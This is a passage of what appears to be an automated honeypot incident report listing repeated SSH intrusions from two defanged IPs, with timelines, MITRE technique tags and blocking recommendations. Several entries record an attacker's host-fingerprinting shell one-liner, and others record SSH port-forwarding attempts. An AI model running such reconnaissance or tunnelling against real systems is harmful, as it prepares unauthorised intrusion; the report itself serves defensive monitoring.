| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 14:55:57` | `cowrie.session.connect` |
| `2026-09-01 14:55:57` | `cowrie.client.version` |
| `2026-09-01 14:55:57` | `cowrie.client.kex` |
| `2026-09-01 14:55:59` | `cowrie.login.success` |
| `2026-09-01 14:56:00` | `cowrie.session.params` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:00` | `cowrie.command.success` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:00` | `cowrie.command.input` |
| `2026-09-01 14:56:01` | `cowrie.log.closed` |
| `2026-09-01 14:56:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a145f215108b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 14:57 |
| **Last Seen** | 2026-09-01 14:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 14:57:43` | `cowrie.session.connect` |
| `2026-09-01 14:57:43` | `cowrie.client.version` |
| `2026-09-01 14:57:43` | `cowrie.client.kex` |
| `2026-09-01 14:57:44` | `cowrie.login.success` |
| `2026-09-01 14:57:46` | `cowrie.session.params` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.command.success` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.command.input` |
| `2026-09-01 14:57:46` | `cowrie.log.closed` |
| `2026-09-01 14:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73b8acdaea06

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 14:58 |
| **Last Seen** | 2026-09-01 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 14:58:26` | `cowrie.session.connect` |
| `2026-09-01 14:58:26` | `cowrie.client.version` |
| `2026-09-01 14:58:26` | `cowrie.client.kex` |
| `2026-09-01 14:58:27` | `cowrie.login.success` |
| `2026-09-01 14:58:27` | `cowrie.direct-tcpip.request` |
| `2026-09-01 14:58:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 14:58:28` | `cowrie.direct-tcpip.data` |
| `2026-09-01 14:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7653afb089cb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 14:59 |
| **Last Seen** | 2026-09-01 14:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 14:59:31` | `cowrie.session.connect` |
| `2026-09-01 14:59:31` | `cowrie.client.version` |
| `2026-09-01 14:59:31` | `cowrie.client.kex` |
| `2026-09-01 14:59:32` | `cowrie.login.success` |
| `2026-09-01 14:59:33` | `cowrie.session.params` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:33` | `cowrie.command.success` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:33` | `cowrie.command.input` |
| `2026-09-01 14:59:34` | `cowrie.log.closed` |
| `2026-09-01 14:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce3e7691789

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:00 |
| **Last Seen** | 2026-09-01 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:00:11` | `cowrie.session.connect` |
| `2026-09-01 15:00:11` | `cowrie.client.version` |
| `2026-09-01 15:00:12` | `cowrie.client.kex` |
| `2026-09-01 15:00:12` | `cowrie.login.success` |
| `2026-09-01 15:00:13` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:00:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:00:13` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-139bd1baca77

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:01 |
| **Last Seen** | 2026-09-01 15:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:01:24` | `cowrie.session.connect` |
| `2026-09-01 15:01:24` | `cowrie.client.version` |
| `2026-09-01 15:01:24` | `cowrie.client.kex` |
| `2026-09-01 15:01:25` | `cowrie.login.success` |
| `2026-09-01 15:01:26` | `cowrie.session.params` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.command.success` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.command.input` |
| `2026-09-01 15:01:26` | `cowrie.log.closed` |
| `2026-09-01 15:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72eca7f44897

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:03 |
| **Last Seen** | 2026-09-01 15:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:03:26` | `cowrie.session.connect` |
| `2026-09-01 15:03:26` | `cowrie.client.version` |
| `2026-09-01 15:03:26` | `cowrie.client.kex` |
| `2026-09-01 15:03:27` | `cowrie.login.success` |
| `2026-09-01 15:03:28` | `cowrie.session.params` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:28` | `cowrie.command.success` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:28` | `cowrie.command.input` |
| `2026-09-01 15:03:29` | `cowrie.log.closed` |
| `2026-09-01 15:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97e40bc118b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:05 |
| **Last Seen** | 2026-09-01 15:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:05:20` | `cowrie.session.connect` |
| `2026-09-01 15:05:20` | `cowrie.client.version` |
| `2026-09-01 15:05:20` | `cowrie.client.kex` |
| `2026-09-01 15:05:21` | `cowrie.login.success` |
| `2026-09-01 15:05:23` | `cowrie.session.params` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.command.success` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.command.input` |
| `2026-09-01 15:05:23` | `cowrie.log.closed` |
| `2026-09-01 15:05:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3555ed6773bb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:07 |
| **Last Seen** | 2026-09-01 15:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:07:08` | `cowrie.session.connect` |
| `2026-09-01 15:07:08` | `cowrie.client.version` |
| `2026-09-01 15:07:08` | `cowrie.client.kex` |
| `2026-09-01 15:07:09` | `cowrie.login.success` |
| `2026-09-01 15:07:11` | `cowrie.session.params` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:11` | `cowrie.command.success` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:11` | `cowrie.command.input` |
| `2026-09-01 15:07:12` | `cowrie.log.closed` |
| `2026-09-01 15:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbe9abc02f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:07 |
| **Last Seen** | 2026-09-01 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:07:54` | `cowrie.session.connect` |
| `2026-09-01 15:07:54` | `cowrie.client.version` |
| `2026-09-01 15:07:55` | `cowrie.client.kex` |
| `2026-09-01 15:07:55` | `cowrie.login.success` |
| `2026-09-01 15:07:56` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:07:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:07:56` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce5f44772c08

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:10 |
| **Last Seen** | 2026-09-01 15:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:10:35` | `cowrie.session.connect` |
| `2026-09-01 15:10:35` | `cowrie.client.version` |
| `2026-09-01 15:10:35` | `cowrie.client.kex` |
| `2026-09-01 15:10:37` | `cowrie.login.success` |
| `2026-09-01 15:10:38` | `cowrie.session.params` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:38` | `cowrie.command.success` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:38` | `cowrie.command.input` |
| `2026-09-01 15:10:39` | `cowrie.log.closed` |
| `2026-09-01 15:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12df65a16703

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 15:10 |
| **Last Seen** | 2026-09-01 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:10:51` | `cowrie.session.connect` |
| `2026-09-01 15:10:51` | `cowrie.client.version` |
| `2026-09-01 15:10:52` | `cowrie.client.kex` |
| `2026-09-01 15:10:52` | `cowrie.login.success` |
| `2026-09-01 15:10:53` | `cowrie.direct-tcpip.request` |
| `2026-09-01 15:10:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 15:10:53` | `cowrie.direct-tcpip.data` |
| `2026-09-01 15:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7cf331e4c0b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:12 |
| **Last Seen** | 2026-09-01 15:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:12:20` | `cowrie.session.connect` |
| `2026-09-01 15:12:20` | `cowrie.client.version` |
| `2026-09-01 15:12:20` | `cowrie.client.kex` |
| `2026-09-01 15:12:22` | `cowrie.login.success` |
| `2026-09-01 15:12:23` | `cowrie.session.params` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:23` | `cowrie.command.success` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:23` | `cowrie.command.input` |
| `2026-09-01 15:12:24` | `cowrie.log.closed` |
| `2026-09-01 15:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e36e4862811d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:14 |
| **Last Seen** | 2026-09-01 15:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 15:14:04` | `cowrie.session.connect` |
| `2026-09-01 15:14:04` | `cowrie.client.version` |
| `2026-09-01 15:14:04` | `cowrie.client.kex` |
| `2026-09-01 15:14:06` | `cowrie.login.success` |
| `2026-09-01 15:14:07` | `cowrie.session.params` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:07` | `cowrie.command.success` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:07` | `cowrie.command.input` |
| `2026-09-01 15:14:08` | `cowrie.log.closed` |
| `2026-09-01 15:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec212e81b26

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-01 15:15 |
| **Last Seen** | 2026-09-01 15:15 |
| **Session Duration** | 5s |
